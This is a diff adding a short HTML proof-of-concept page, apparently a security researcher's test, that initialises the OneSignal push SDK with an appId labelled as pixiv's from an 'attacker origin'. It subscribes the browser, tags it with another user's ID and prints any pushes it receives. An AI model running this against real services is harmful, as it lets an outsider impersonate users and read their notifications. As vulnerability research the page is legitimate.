@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>attacker origin test</title></head>
+<body>
+<h3>zqx7 attacker-origin OneSignal test (pixiv appId)</h3>
+<button id="sub">1. Subscribe player</button>
+<button id="tag">2. sendTags user_id=130950145</button>
+<button id="stat">3. Status</button>
+<pre id="out"></pre>
+<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async></script>
+<script>
+const out = s => document.getElementById('out').textContent += s + "\n";
+window.OneSignal = window.OneSignal || [];
+OneSignal.push(function() {
+  OneSignal.init({ appId: "b2af994d-2a00-40ba-b1fa-684491f6760a", notifyButton: { enable: false } });
+});
+OneSignal.push(function() {
+  OneSignal.on('notificationDisplay', n => out("[PUSH RECEIVED] " + JSON.stringify(n)));
+});
+document.getElementById('sub').onclick = async () => {
+  try { await OneSignal.registerForPushNotifications(); out("registered, permission=" + Notification.permission); } catch(e) { out("sub err: " + e); }
+};
+document.getElementById('tag').onclick = async () => {
+  try { const r = await OneSignal.sendTags({user_id: 130950145}); out("sendTags -> " + JSON.stringify(r)); } catch(e) { out("tag err: " + e); }
+};
+document.getElementById('stat').onclick = async () => {
+  try {
+    const id = await OneSignal.getUserId();
+    const t = await OneSignal.getTags();
+    out("playerId=" + id + " tags=" + JSON.stringify(t));
+  } catch(e) { out("stat err: " + e); }
+};
+</script>
+</body>
+</html>
